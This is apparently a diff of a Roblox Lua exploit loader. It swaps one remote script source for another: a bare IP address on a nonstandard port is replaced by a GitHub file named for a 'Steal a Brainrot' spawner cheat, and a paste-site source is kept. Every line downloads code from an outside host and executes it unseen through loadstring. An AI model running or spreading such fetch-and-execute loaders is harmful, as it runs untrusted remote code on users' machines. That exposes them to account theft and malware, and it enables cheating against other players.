@@ -1,2 +1,2 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Crypoth/StealABrainRotSpawner/refs/heads/main/XwareSpawner"))()                                   
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/rMKuJDkEEFB40ymr/raw"))()
